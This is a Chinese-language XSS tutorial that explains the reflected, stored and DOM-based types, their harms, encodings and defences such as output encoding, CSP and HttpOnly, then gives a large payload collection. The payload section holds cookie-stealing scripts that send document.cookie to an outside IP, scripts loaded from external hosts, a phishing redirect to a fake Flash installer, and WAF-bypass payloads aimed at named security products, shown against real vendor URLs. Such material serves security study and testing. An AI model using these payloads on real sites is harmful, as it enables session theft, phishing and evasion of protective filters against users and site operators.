XSS全称为Cross Site Scripting，为了和CSS(Cas-cading Style Sheet,)分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指恶意攻击者往Web站点里插入恶意脚本代码，当用户浏览该网站时，嵌入其里面的脚本代码会被执行，从而达到恶意用户的特殊目的。

	XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般是使用JavaScript 语言。JavaScript可以用来获取用户的Cookie、改变网页内容、URL调转，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者需要做的仅仅是向Web页面中注入JavaScript代码。

根据是否写入数据看来分类主要有反射性和存储型两大类。

- 反射型跨站脚本
- 储存型跨站脚本
- DOM型跨站脚本


# 常见应用场景

## 2.1 反射型XSS
	反射性XSS通常需要被攻击者点击对应的链接才能触发。攻击方式:攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。
	
	反射型xss应用场景：比如搜索、查询，接口调用，跳转，http头获取参数地理位置，cookie，id，referer等一切输入、输出的地方。

实例：[pikachu-XSS(跨站脚本漏洞)](/docs/bc/bc-1d84tqcobr5in)


## 2.2 存储型XSS

	存储型XSS由于存储在数据库或其他持久性中间件中，所以用户只需浏览了包含恶意代码的页面即可在用户无感知的情况下触发。攻击方式:这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。 随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。
	
	存储型xss应用场景：比如注册处、用户名、地址、头像等信息，用户反馈、留言、修改个人信息、发表文章、评论、转发、私信等一切输入输出的地方。

实例：[pikachu-XSS(跨站脚本漏洞)](/docs/bc/bc-1d84tqcobr5in)


## 2.3DOM型XSS

	DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构一节点树。通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。

![image.png](../../_img/02-Web安全/1655877299491-9b82ba8c-25c6-4cef-8f73-3fcaacc0e202.png)

	攻击方式:用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。

实例：[pikachu-XSS(跨站脚本漏洞)](/docs/bc/bc-1d84tqcobr5in)


## 2.3 漏洞危害

**钓鱼欺骗**：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式。

**网站挂马**：跨站后利用IFrame嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。

**身份盗用**：Cookie是用户对于特定网站的身份验证标志，XSS可以盗取用户的Cookie，就可以获取到用户对网站的操作权限，从而查看用户隐私信息。

**用户劫持**：一些高级的XSS，比如xss蠕虫等。控制受害者机器向其他系统发起攻击。


# XSS编码

## JS编码
JS提供了四种字符编码的策略，如下所示。

- 三个八进制数字，如果个数不够，在前面补0,例如“e”的编码为“\145”
- 两个十六进制数字，如果个数不够,在前面补0,例如“e”的编码为“\x65"。
- 四个十六进制数字,如果个数不够,在前面补0,例如“e”的编码为“\u0065”。
- 对于一些控制字符，使用特殊的C类型的转义风格(例如\n和\r)


## HTML 实体编码
**命名实体**:以&开头，以分号结尾的，例如“<”的编码是“<"。<br />**字符编码**:十进制、十六进制ASCII码或Unicode字符编码，样式为“&#数值;例如“<”可以编码为`“&#060;”`和`“&#x3c;”`。


## URL编码
这里的URL编码，也是两次URL全编码的结果。如果alert被过滤，结果为`%25%36%3 1%25%36%63%25%36%35%25%37%32%25%37%34`。在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。


# 修复建议

## 4.1 代码层面

#### 4.1.1 在服务端进行输入验证（输入验证）
服务器后端进行输入验证，包括输入的数据类型、数据长度、数据格式、特殊字符等进行验证。


#### 4.1.2 数据输出实体编码（输出编码）
输出编码手段主要有3种编码：URL编码、HTML编码和JavaScript编码。JAVA：开源的ESAPI library；框架（Spring：HtmlUtils.htmlEscape） PHP：使用htmlspecialchars等函数进行过滤输出


### 4.2 其他层面

#### 4.2.1 使用模版引擎
开启模板引擎自带的 HTML 转义功能。例如：在 ejs 中，尽量使用 <%= data %> 而不是 <%- data %>；在 doT.js 中，尽量使用{{! data } 而不是 {{= data }；在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 freemarker.core.OutputFormat。


#### 4.2.2 避免内敛事件
尽量不要使用 onLoad="onload('{}')"、onClick="go('{}')"这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener()事件绑定会更安全。


#### 4.2.3 避免拼接 HTML
前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。


#### 4.2.4 使用CSP
Content Security Policy：禁止加载外域代码，防止复杂的攻击逻辑；禁止外域提交，网站被攻击后，用户的数据不会泄露到外域；禁止内联脚本执行；禁止未授权的脚本执行。


#### 4.2.5 使用httponly
HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。httponly无法完全的防御xss漏洞，它只是规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题。Httponly是在set-cookie时标记的，可对单独某个参数标记也可对全部参数标记。由于设置httponly的方法比较简单，使用也很灵活，并且对防御cookie劫持非常有用，因此已经渐渐成为一种默认的标准。


# XSS-Payload
**弹窗**
```
<script>alert(1)</script><script>prompt(2)</script><script>confirm(3)</script><script>console.log(3)</script><script>document.write(1)</script>
```

**当不能弹窗的时候，可以用下面的payload来证明**
```
<script>console.log(3)</script><script>document.write(1)</script>
```

**引入外部js，可能需要短域名**
```
<script src=//xsshs.cn></script><img src onerror=appendChild(createElement("script")).src="//xsshs.cn/aaaa"><img src onerror=jQuery.getScript("//xsshs.cn/aaaa")>
```

**盗取cookie**
```
<script>window.location.href="http://2.2.2.2/?msg="+escape(document.cookie)</script><script>document.body.appendChild(document.createElement("img")).src="http://2.2.2.2/?msg="+escape(document.cookie)</script>
```

**结合弹窗和url跳转进行钓鱼**
```
<script>alert("您的flash版本过低，请更新您的flash版本"); window.location.href ="https://www.flash.cn/cdm/latest/flashplayer_install_cn.exe"</script>
```

**当xss的触发位置在标签外**
```
name=<script>alert(1)</script>
```

**标签内**
```
name="><script>alert(1)</script>
name=1" id=javascript:alert(1) autofocus onfocus=location=this.id xx="
```

**在href=中**
```
name=javascript:alert(1)
```

**在js中**
```
name=</script><script>alert(1)</script>
name=';alert(1)//
name='-alert(1)-'
name=';};alert(1);function a(){a='
```

**在xml中**
```
<?xml version="1.0"?><a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(/XSS/)'></a>

<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1);</html:script></html:html>
```

**svg**
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">  <image id="image0" width="751" height="751" x="0" y="0"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
<script>alert(1)</script>
</svg>
```

**当过滤了圆括号**
```
<script>alert`1`</script><video src onerror=a="%2",location="javascript:aler"+"t"+a+"81"+a+"9"><video src onerror="javascript:window.onerror=alert;throw 1">
```

**当过滤了空格**
```
假设payload如下： 

html><imgAAsrcAAonerrorBB=BBalertCC(1)DD</html>

A位置可填充/，/123/，%09，%0A，%0C，%0D，%20 
B位置可填充%09，%0A，%0C，%0D，%20 
C位置可填充%0B，如果加双引号，则可以填充/**/，%09，%0A ，%0C，%0D，%20 
D位置可填充%09，%0A，%0C，%0D，%20，//，>
```

函数配合拼接
```
<video/src/onerror=top.alert(1);>
<video/src/onerror=top[`al`+`ert`](1);>
<video/src/onerror=self[`al`+`ert`](1);>
<video/src/onerror=parent[`al`+`ert`](1);>
<video/src/onerror=window[`al`+`ert`](1);>
<video/src/onerror=frames[`al`+`ert`](1);>
<video/src/onerror=content[`al`+`ert`](1);>
<body/onload=eval(alert(1));>
<body/onload=eval(`al`+`ert(1)`);>
<body/onload=open(alert(1));>
<body/onload=document.write(alert(1));>
<body/onload=setTimeout(alert(1));>
<body/onload=setInterval(alert(1));>
<body/onload=Set.constructor(alert(1))()>
<body/onload=Map.constructor(alert(1))()>
<body/onload=Array.constructor(alert(1))()>
<body/onload=WeakSet.constructor(alert(1))()>
<body/onload=constructor.constructor(alert(1))>
<video/src/onerror=[1].map(alert);>
<video/src/onerror=[1].map(eval('al'+'ert'));>
<video/src/onerror=[1].find(alert);>
<video/src/onerror=[1].every(alert);>
<video/src/onerror=[1].filter(alert);>
<video/src/onerror=[1].forEach(alert);>
<video/src/onerror=[1].findIndex(alert);>
```

**赋值和拼接**
```
<img src onerror=_=alert,_(1)>
<img src alt=al lang=ert onerror=top[alt+lang](1)>
<img src onerror=top[a='al',b='ev',b+a]('alert(1)')>
<img src onerror=['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)>
```

**创建匿名函数**
```
<video/src/onerror=Function('ale'+'rt(1)')();>
```

**伪协议**
```
<svg/onload=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<form action=javascript:alert(1)><input type=submit>
<a href=javascript:alert(123);>xss</a>
<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=>
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=></object>
<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==">
```

**安全狗**
```
http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=top[`al`%2B`ert`](1);>

http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=appendChild(createElement("script")).src="//z.cn">
```

**D盾**
```
http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[`al`%2B`ert`](1);>

http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```

**云锁+奇安信waf**
```
http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[`al`%2B`ert`](1);>

http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```

**一些新奇的xss playload**
```
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<input onfocus=alert(1) autofocus>
<h1 onmousemove="alert(1)">title</h1>
<select onfocus=alert(1) autofocus>
<iframe src="vbscript:msgbox(1)"></iframe> 
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe>
<iframe onload=alert(1)></iframe>
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> 
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> 
</iframe><iframe src="vbscript:msgbox(1)"></iframe>
</iframe><iframe src="data:text/html,<script>alert(0)</script>"></iframe>
<details open ontoggle=prompt(/xss/)>
<plaintext/onmouseover=prompt(1)>
javascript://comment％250aalert(1) 
<img src=x onerror=confirm(1)>
<video><source onerror=alert(1)>
<audio src=x onerror="alert(1)">
<body onload=alert(1)>
<body onscroll=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<textarea onfocus=alert(1) autofocus>
```

其它
```
</span><script>alert('hello，gaga!');</script><s>
<script>alert('hello，gaga!');</script>
>"'><img src="javascript.:alert('XSS')">
>"'><script>alert('XSS')</script>
<table background='javascript.:alert(([code])'></table>
<object type=text/html data='javascript.:alert(([code]);'></object>
"+alert('XSS')+"
'><script>alert(document.cookie)</script>
='><script>alert(document.cookie)</script>
<script>alert(document.cookie)</script>
<script>alert(vulnerable)</script>
<s&#99;ript>alert('XSS')</script>
<img src="javas&#99;ript:alert('XSS')">
%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
<script>alert('Vulnerable')</script>
a.jsp/<script>alert('Vulnerable')</script>
"><script>alert('Vulnerable')</script>
<IMG SRC="javascript.:alert('XSS');">
<IMG src="/javascript.:alert"('XSS')>
<IMG src="/JaVaScRiPt.:alert"('XSS')>
<IMG src="/JaVaScRiPt.:alert"(&quot;XSS&quot;)>
<IMG SRC="jav&#x09;ascript.:alert('XSS');">
<IMG SRC="jav&#x0A;ascript.:alert('XSS');">
<IMG SRC="jav&#x0D;ascript.:alert('XSS');">
"<IMG src="/java"\0script.:alert(\"XSS\")>";'>out
<IMG SRC=" javascript.:alert('XSS');">
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<BODY BACKGROUND="javascript.:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript.:alert('XSS')">
<IMG LOWSRC="javascript.:alert('XSS')">
<BGSOUND SRC="javascript.:alert('XSS');">
<br size="&{alert('XSS')}">
<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>
<LINK REL="stylesheet"HREF="javascript.:alert('XSS');">
<IMG SRC='vbscript.:msgbox("XSS")'>
<META. HTTP-EQUIV="refresh"CONTENT="0;url=javascript.:alert('XSS');">
<IFRAME. src="/javascript.:alert"('XSS')></IFRAME>
<FRAMESET><FRAME. src="/javascript.:alert"('XSS')></FRAME></FRAMESET>
<TABLE BACKGROUND="javascript.:alert('XSS')">
<DIV STYLE="background-image: url(javascript.:alert('XSS'))">
<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html&#39;);">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE='xss:expre\ssion(alert("XSS"))'>
<STYLE. TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE. TYPE="text/css">.XSS{background-image:url("javascript.:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE. type="text/css">BODY{background:url("javascript.:alert('XSS')")}</STYLE>
<BASE HREF="javascript.:alert('XSS');//">
getURL("javascript.:alert('XSS')")
a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);
<XML SRC="javascript.:alert('XSS');">
"> <BODY NLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
<SCRIPT. SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
<IMG SRC="javascript.:alert('XSS')"
<SCRIPT. a=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT.=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT. a=">"''SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT."a='>'"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PTSRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>
```
